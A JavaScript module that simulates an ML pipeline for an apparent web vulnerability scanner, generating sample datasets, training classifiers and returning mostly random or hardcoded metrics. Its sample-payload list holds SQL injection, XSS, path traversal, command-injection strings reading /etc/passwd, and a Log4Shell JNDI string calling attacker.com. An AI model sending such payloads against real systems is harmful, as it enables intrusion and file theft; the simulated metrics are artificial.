
// ML Backend Simulation for development and testing
// This simulates the Python ML pipeline endpoints

import { 
  trainClassifier, 
  PayloadGenerator,
  parseUploadedDataset,
  preprocessData 
} from './enhanced_ml_models.js';

// Simulate ML analysis pipeline
export const simulateMLAnalysis = async () => {
  console.log('🧠 Simulating ML Analysis Pipeline...');
  
  // Simulate loading and analyzing dataset
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  // Generate sample dataset for analysis
  const sampleDataset = generateSampleDataset();
  
  // Initialize payload generator
  const payloadGen = new PayloadGenerator();
  payloadGen.analyzeDataset(sampleDataset);
  
  // Generate payloads
  const generatedPayloads = payloadGen.generate_payloads(5);
  
  // Train models
  const trainingResult = await trainClassifier(sampleDataset);
  
  // Calculate anomaly detection rate
  const anomalyRate = Math.random() * 0.3 + 0.1; // 10-40%
  
  const result = {
    status: 'success',
    message: 'ML analysis pipeline completed successfully',
    payloads: generatedPayloads,
    patterns: payloadGen.common_patterns || ['OR 1=1', '<script>', '../', '|', ';'],
    model_performance: {
      accuracy: trainingResult.accuracy || 0.87,
      precision: 0.84,
      recall: 0.82,
      f1_score: 0.83
    },
    anomaly_detection_rate: anomalyRate,
    generated_payloads_count: generatedPayloads.length,
    exploitdb_payloads_count: Math.floor(Math.random() * 10) + 5,
    training_time: `${Math.floor(Math.random() * 3) + 2}m ${Math.floor(Math.random() * 60)}s`,
    timestamp: new Date().toISOString(),
    class_distribution: trainingResult.class_distribution || {
      'safe': 45,
      'suspicious': 25, 
      'malicious': 30
    }
  };
  
  console.log('✅ ML Analysis completed:', result);
  return result;
};

// Simulate payload generation
export const simulatePayloadGeneration = async (context = '', numSamples = 5) => {
  console.log(`🚀 Simulating payload generation for: ${context || 'general'}`);
  
  await new Promise(resolve => setTimeout(resolve, 1500));
  
  const payloadGen = new PayloadGenerator();
  const payloads = payloadGen.generate_payloads(numSamples);
  
  const result = {
    status: 'success',
    message: 'Payloads generated successfully',
    payloads: payloads,
    count: payloads.length,
    context: context || 'general',
    timestamp: new Date().toISOString()
  };
  
  console.log('✨ Payloads generated:', result);
  return result;
};

// Simulate model training
export const simulateModelTraining = async (dataset = null) => {
  console.log('🎯 Simulating model training...');
  
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  const trainingDataset = dataset || generateSampleDataset();
  const result = await trainClassifier(trainingDataset);
  
  console.log('✅ Model training completed:', result);
  return {
    status: 'success',
    message: 'Models trained successfully',
    ...result,
    timestamp: new Date().toISOString()
  };
};

// Simulate dataset analysis
export const simulateDatasetAnalysis = async (dataset) => {
  console.log('📊 Simulating dataset analysis...');
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  const patterns = extractPatterns(dataset);
  const classDistribution = getClassDistribution(dataset);
  
  const result = {
    status: 'success',
    message: 'Dataset analysis completed',
    patterns: patterns,
    class_distribution: classDistribution,
    total_samples: dataset.length,
    successful_payloads: dataset.filter(item => 
      item.label === 'malicious' || item.label === 'suspicious'
    ).length,
    timestamp: new Date().toISOString()
  };
  
  console.log('📈 Dataset analysis completed:', result);
  return result;
};

// Generate sample dataset for testing
const generateSampleDataset = () => {
  const dataset = [];
  
  const vulnerabilityTypes = ['sql_injection', 'xss', 'path_traversal', 'command_injection'];
  const severities = ['low', 'medium', 'high', 'critical'];
  
  for (let i = 0; i < 100; i++) {
    const isMalicious = Math.random() > 0.7;
    
    dataset.push({
      id: i,
      payload: isMalicious ? generateMaliciousPayload() : generateSafePayload(),
      label: isMalicious ? (Math.random() > 0.5 ? 'malicious' : 'suspicious') : 'safe',
      vulnerability_type: isMalicious ? vulnerabilityTypes[Math.floor(Math.random() * vulnerabilityTypes.length)] : null,
      severity: isMalicious ? severities[Math.floor(Math.random() * severities.length)] : 'low',
      response_code: isMalicious ? (Math.random() > 0.6 ? 500 : 200) : 200,
      alert_detected: isMalicious && Math.random() > 0.3,
      error_detected: isMalicious && Math.random() > 0.5,
      body_word_count_changed: Math.random() > 0.4,
      timestamp: Date.now() - Math.floor(Math.random() * 86400000)
    });
  }
  
  return dataset;
};

const generateMaliciousPayload = () => {
  const maliciousPayloads = [
    "' OR 1=1 --",
    "<script>alert('XSS')</script>",
    "../../etc/passwd",
    "; cat /etc/passwd",
    "admin' --",
    "<img src=x onerror=alert(1)>",
    "../../../../windows/system32/cmd.exe",
    "| ls -la",
    "' UNION SELECT NULL, version() --",
    "${jndi:ldap://attacker.com/x}"
  ];
  
  return maliciousPayloads[Math.floor(Math.random() * maliciousPayloads.length)];
};

const generateSafePayload = () => {
  const safePayloads = [
    "normal_user",
    "valid_input",
    "12345",
    "example.com",
    "john.doe@example.com",
    "Hello World",
    "test_data",
    "user123",
    "2023-09-15",
    "normal text input"
  ];
  
  return safePayloads[Math.floor(Math.random() * safePayloads.length)];
};

const extractPatterns = (dataset) => {
  const patterns = {};
  
  dataset.forEach(item => {
    if (item.label === 'malicious' || item.label === 'suspicious') {
      if (item.payload.includes('OR 1=1')) patterns['sql_injection'] = (patterns['sql_injection'] || 0) + 1;
      if (item.payload.includes('<script>')) patterns['xss'] = (patterns['xss'] || 0) + 1;
      if (item.payload.includes('../')) patterns['path_traversal'] = (patterns['path_traversal'] || 0) + 1;
      if (item.payload.includes(';') || item.payload.includes('|')) patterns['command_injection'] = (patterns['command_injection'] || 0) + 1;
    }
  });
  
  return patterns;
};

const getClassDistribution = (dataset) => {
  const distribution = {};
  
  dataset.forEach(item => {
    distribution[item.label] = (distribution[item.label] || 0) + 1;
  });
  
  return distribution;
};

// Simulate model status
export const simulateModelStatus = async () => {
  return {
    status: 'success',
    models_loaded: true,
    isolation_forest: {
      trained: true,
      contamination: 0.1,
      n_estimators: 100
    },
    random_forest: {
      trained: true,
      n_estimators: 100,
      accuracy: 0.87
    },
    payload_generator: {
      ready: true,
      patterns_learned: 15
    },
    last_training: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
    timestamp: new Date().toISOString()
  };
};

// Export simulation functions
export default {
  simulateMLAnalysis,
  simulatePayloadGeneration,
  simulateModelTraining,
  simulateDatasetAnalysis,
  simulateModelStatus
};
